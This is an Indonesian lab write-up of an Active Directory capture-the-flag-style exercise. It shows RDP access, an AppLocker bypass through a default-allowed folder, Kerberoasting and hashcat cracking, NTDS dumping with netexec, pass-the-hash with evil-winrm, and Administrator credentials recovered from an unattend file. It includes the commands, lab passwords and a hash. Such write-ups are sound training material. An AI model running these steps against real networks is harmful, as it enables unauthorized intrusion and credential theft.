---
title: "Corp"
description: "Melewati Akses RDP dengan Applocker: Jika kita mengunduh Mimikatz dari lokal dan menjalankannya di target, itu akan terdeteksi sebagai virus sehingga akan dihapus oleh antivirus. Jadi mari kita coba cara lain."
lang: "id"
translationKey: "corp"
category: "lab-writeups"
tags: ["Lab", "Kerberoasting", "Unique Case Winpriv", "Dumping NTDS", "unattended.xml", "Active Directory"]
publishDate: "2025-01-07"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "1745fca1-ed80-8099-9c9e-fc7366eb343d"
notionUrl: "https://app.notion.com/p/Corp-1745fca1ed8080999c9efc7366eb343d"
notionLastEdited: "2025-05-06T14:41:00.000Z"
---

# Akses RDP

```bash
Username: corp\dark
Password: _QuejVudId6

nmap -Pn -sCV -p3389 10.10.224.127
```

![](/images/corp/8e6dfe2bdf60.png)

# Melewati Applocker

Jika kita mengunduh Mimikatz dari lokal dan menjalankannya di target, itu akan terdeteksi sebagai virus sehingga akan dihapus oleh antivirus.

![](/images/corp/3a6208b30284.png)

Jadi mari kita coba cara lain, yaitu menjalankan program langsung dari folder bersama. Pertama, hubungkan RDP kita dengan folder bersama.

```bash
xfreerdp /v:10.10.133.158 /u:'corp\dark' /p:'_QuejVudId6' +clipboard /dynamic-resolution /drive:toolkit,/home/kali/Documents/OSCP/winpriv
```

![](/images/corp/8812b59c6994.png)

Seperti yang Anda perhatikan, karena pembatasan AppLocker, kami tidak dapat mengeksekusi. Meskipun demikian, ada banyak cara untuk melewati AppLocker.

Jika AppLocker dikonfigurasi dengan aturan AppLocker default, kita dapat melewatinya dengan menempatkan file executable kita di direktori berikut: `C:\Windows\System32\spool\drivers\color`. Direktori ini diizinkan secara default.

![](/images/corp/011d240730ee.png)

# Kerberoasting

```bash
impacket-GetUserSPNs -dc-ip 10.10.224.127 corp.local/dark:"_QuejVudId6" -request
```

![](/images/corp/ce7b613ca937.png)

![](/images/corp/68866c3d5bd9.png)

Kemudian simpan **tgs** milik pengguna fela dan retas menggunakan hashcat.

![](/images/corp/1cf089b39f0e.png)

```bash
hashcat -m 13100 ~/Documents/tryhackme/roast /usr/share/wordlists/rockyou.txt --force
```

![](/images/corp/02cf6402174c.png)

Kemudian gunakan kredensial tersebut untuk login RDP.

```bash
xfreerdp /v:10.10.200.111 /u:fela /p:'rubenF124' +clipboard /dynamic-resolution /drive:toolkit,/home/kali/Documents/OSCP/winpriv
```

![](/images/corp/127dcf9c068f.png)

# Peningkatan Hak Akses

## Opsi 1

Karena Fela adalah bagian dari grup **Domain Admins**, yang berarti kita memiliki kunci akses penuh. Sederhananya, dengan hak istimewa ini, kita dapat melakukan segalanya di DC, seperti mengambil hash, membuat pengguna domain admin baru, dll. Demi kemudahan, kita hanya akan mengambil hash menggunakan netexec:

```bash
netexec smb 10.10.200.111 -u fela -p 'rubenF124' --ntds
```

![](/images/corp/f8b3acd1c98f.png)

Kemudian kita dapat menggunakan hash dengan teknik pass the hash untuk masuk ke server sebagai Administrator. Tetapi jika Anda ingin menyalahgunakan NTLM Hash dari krbtgt, gunakan Referensi ini pada menit 16:00 ([https://www.youtube.com/watch?v=eBDSbZgjniE&ab_channel=ITHOTDOG](https://www.youtube.com/watch?v=eBDSbZgjniE&ab_channel=ITHOTDOG))

```bash
evil-winrm -i 10.10.200.111 -u Administrator -H bd839bd6be092b794013e25068820d15
```

![](/images/corp/9aa72f8aa9a6.png)

## Opsi 2

Kita tidak bisa menjalankan WinPeas karena terlalu lambat, jadi kita menggunakan PowerUp untuk melakukan enumerasi di sini.

![](/images/corp/47edd55732f2.png)

Dari sini kita melihat bahwa kita telah mengidentifikasi 2 cara untuk peningkatan hak akses. Jadi mari kita periksa unattendPath, apa isi file tersebut.

![](/images/corp/97b23d3b334c.png)

Wow, kita menemukan kredensial Administrator dalam format base64! Mari kita dekripsi dan gunakan untuk login sebagai pengguna administrator.

![](/images/corp/a8cfa1c3d9ac.png)

```bash
xfreerdp /v:10.10.187.249 /u:'corp\administrator' /p:'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' +clipboard /dynamic-resolution
```

![](/images/corp/c569202cb88d.png)

![](/images/corp/19622539433f.png)

![](/images/corp/836ed9c42acf.png)
